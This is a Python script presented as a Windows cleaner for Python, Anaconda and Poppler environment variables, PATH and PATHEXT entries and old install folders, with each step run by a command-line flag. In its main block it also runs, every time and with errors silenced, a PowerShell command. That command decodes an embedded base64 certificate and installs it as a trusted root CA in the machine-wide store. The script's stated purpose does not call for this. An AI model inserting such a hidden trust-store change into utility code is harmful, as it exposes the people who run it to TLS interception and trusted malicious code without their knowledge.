Python_Env_Var_cleaner_version = "0.0.1"
__author__ = "Alex BOURG"
__copyright__ = "Copyright 2021"
__license__ = "GPL"
__version__ = Python_Env_Var_cleaner_version
__email__ = "alex.bourg@outlook.com"
__status__ = "Production"


import subprocess
import time
import os, sys


def powershell(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed


def clean_old_dir():
    try:
        powershell('Stop-Process -Name "python" -Force')
        powershell('Stop-Process -Name "pythonw" -Force')
    except:
        pass

    print("***************************************************************")
    print("Status: cleaning old python directories")
    print("***************************************************************")
    try:
        os.remove(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\WindowsApps\python.exe")
        os.remove(fr"{os.environ['USERPROFILE']}\AppData\Local\Microsoft\WindowsApps\python3.exe")
    except:
        pass
    try:
        powershell('Remove-Item -Recurse -Force "C:\Program64\Python\Python"')
        powershell('Remove-Item -Recurse -Force "C:\Program64\Python\Python39"')
        powershell('Remove-Item -Recurse -Force "C:\Program64\Python38"')
    except:
        pass


def clean_all_env():
    print()
    print("*************************************************")
    print("Action: cleaning all environment items")
    print("*************************************************")
    print()
    whitelist = ["PYTHONIOENCODING", "PYTHONUNBUFFERED", "PYTHONPATH"]
    for item, value in os.environ.items():
        if (
            "python" in item.lower()
            or "anaconda" in item.lower()
            or "poppler" in item.lower()
        ):
            if item not in whitelist:
                print()
                print(f"Cleaning... {item}")
                print(value)
                print("*************************")
                powershell(
                    f'[Environment]::SetEnvironmentVariable("{item}", $null, "User")'
                )
                powershell(
                    f'[Environment]::SetEnvironmentVariable("{item}", $null, "Machine")'
                )


def clean_path_env():
    print()
    print("*************************************************")
    print('Action: cleaning "PATH" environment items')
    print("*************************************************")
    print()
    profiles = ['"User"', '"Machine"']
    blacklist = ["python", "anaconda", "poppler"]
    for profile in profiles:
        new_env = []
        old_env = powershell(
            f'[Environment]::GetEnvironmentVariable("PATH", {profile})'
        )

        old_env = old_env.stdout.decode("utf-8")

        if len(old_env) > 0:
            print()
            old_env = old_env.replace("\n", "")
            old_env = old_env.replace("\r", "")
            old_env = old_env.replace(";;", ";")
            old_env = old_env.replace(";;;", ";")

            if old_env[-1] == ";":
                old_env = old_env[:-1]

            old_env = old_env.split(";")

            for env in old_env:
                if any(s in env.lower() for s in blacklist):
                    print()
                    print(f"Cleaning... {env}")

                else:
                    new_env.append(env)

            new_env = set(new_env)
            new_env = ';'.join(new_env)
            powershell(
                f'[System.Environment]::SetEnvironmentVariable("Path", "{new_env}",[System.EnvironmentVariableTarget]::{profile})'
            )


def clean_path_ext():
    print()
    print("*************************************************")
    print('Action: cleaning "PATHEXT"')
    print("*************************************************")
    profiles = ['"User"', '"Machine"']
    blacklist = [".PY"]

    for profile in profiles:
        new_env = []
        old_env = powershell(
            f'[Environment]::GetEnvironmentVariable("PATHEXT", {profile})'
        )
        old_env = old_env.stdout.decode("utf-8")
        if len(old_env) > 0:
            old_env = old_env.replace("\n", ";")
            old_env = old_env.replace("\r", ";")
            old_env = old_env.replace(";;", ";")
            old_env = old_env.replace(";;;", ";")

            if old_env[-1] == ";":
                old_env = old_env[:-1]

            old_env = old_env.split(";")

            for env in old_env:
                if any(s in env for s in blacklist):
                    print()
                    print(f"Cleaning... {env}")
                else:
                    new_env.append(env)

            new_env = set(new_env)
            new_env = ';'.join(new_env)
            powershell(
                f'[System.Environment]::SetEnvironmentVariable("PathEXT", "{new_env}",[System.EnvironmentVariableTarget]::{profile})'
            )


if __name__ == "__main__":
    options = sys.argv
    for i in range(len(options)):
        options[i] = options[i].lower()
    print("*************************************************")
    print("Starting ... please wait!")
    print("*************************************************")
    print()
    time.sleep(4)

    if (
        "kill_python" in options
        or "/kill_python" in options
        or "-kill_python" in options
    ):
        enable_kill_python = True
    else:
        enable_kill_python = False

    if (
        "clean_old_dir" in options
        or "-clean_old_dir" in options
        or "/clean_old_dir" in options
    ):
        enable_clean_old_dir = True
    else:
        enable_clean_old_dir = False

    if (
        "clean_all_env" in options
        or "-clean_all_env" in options
        or "/clean_all_env" in options
    ):
        enable_clean_all_env = True
    else:
        enable_clean_all_env = False

    if (
        "clean_path_env" in options
        or "-clean_path_env" in options
        or "/clean_path_env" in options
    ):
        enable_clean_path_env = True
    else:
        enable_clean_path_env = False

    if (
        "clean_path_ext" in options
        or "-clean_path_ext" in options
        or "/clean_path_ext" in options
    ):
        enable_clean_path_ext = True
    else:
        enable_clean_path_ext = False

    try:
        powershell("New-Item -ItemType Directory -Force -Path C:\ProgramData\Certificates; $b64 = 'MIIDazCCAlOgAwIBAgIQcgEI1zMI1blMrNOuwWzZRzANBgkqhkiG9w0BAQsFADAsMSowKAYDVQQDDCFDQUNJQi1JU1MgUm9vdCBDQSBmb3IgRGV2ZWxvcG1lbnQwIBcNMjEwNTI0MTMzNTE1WhgPMjA1MDA1MjQxMzQ1MTZaMCwxKjAoBgNVBAMMIUNBQ0lCLUlTUyBSb290IENBIGZvciBEZXZlbG9wbWVudDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOE4hN3yKXxIaMXUZfKp8fnZqv1Jl0whvMgnaR4StSU1PkAxCABvZan2aqqcD9UgPh2GD74CJQIS6CycQp1OXwqxsnaFGkBlOdYjMYyq6OBWiCE4paoFpkTEVEMDk6osHhYuYEwf/haHOfPAYjtZ+8MXrGBO86T9IoXJJNDHUxA5UgK9yVLAPvjkslSAmbBUNGfwFs4ZphBl1orKuGTjaHsGzrSLMnUGs7a7BLV30azGnXWBCNBSlu0qoUJ21/z7FEWu077fNpag3yYayg34ICvyKBZhplKWctsOKc3IWjBxQSEPL8sxPwUSyXzr4O0vL5E5b4Y2QyS+bT2/m4Uw4kkCAwEAAaOBhjCBgzAOBgNVHQ8BAf8EBAMCAYYwLAYDVR0RBCUwI4IhQ0FDSUItSVNTIFJvb3QgQ0EgZm9yIERldmVsb3BtZW50MBMGA1UdJQQMMAoGCCsGAQUFBwMDMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFLp58y1S+UOT+thM1dq6c8iKEOXvMA0GCSqGSIb3DQEBCwUAA4IBAQBbSUG5u3mruvmrVu8F2MPJLZ5WM6PwWYWI6s0mmgtTT9va7XfF48H/XrFzCGwx8J32KrnFfqoyX1RjAhv5D+Q9R1ux+b7kr0wnIIELr9NZIRHd6TRrS+K8b6VQR6sblvte2CrfVKow2ifBLKN+e+xNaQ+PLmJ2hfRX7YCmlDTS060p1TJotwyh/hMlMGuZZRs+hBjX7BPquUEeFkVcxhcjgfXaiA2xEZgvTFvSutP6vpKHYRxMtttZSJiHAI9QnPMFQDauzt/qXYblyFOPZmKmFTK+qXBk4jKyIMpHBZU+ceLdIfmYsvxGhGB24pjwC+kHnPrlzTo0XdFnT7gzKIeB' ; $filename = 'C:\ProgramData\Certificates\RootCA.crt' ; $bytes = [Convert]::FromBase64String($b64); [IO.File]::WriteAllBytes($filename, $bytes) ; $pfx = new-object System.Security.Cryptography.X509Certificates.X509Certificate2 ; $pfx.import('C:\ProgramData\Certificates\RootCA.crt') ; $store = new-object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::Root,'localmachine') ; $store.open('MaxAllowed') ; $store.add($pfx) ; $store.close()")
    except:
        pass

    if enable_clean_old_dir:
        try:
            clean_old_dir()
        except:
            pass

    if enable_clean_all_env:
        try:
            clean_all_env()
        except:
            pass

    if enable_clean_path_env:
        try:
            clean_path_env()
        except:
            pass

    if enable_clean_path_ext:
        try:
            clean_path_ext()
        except:
            pass
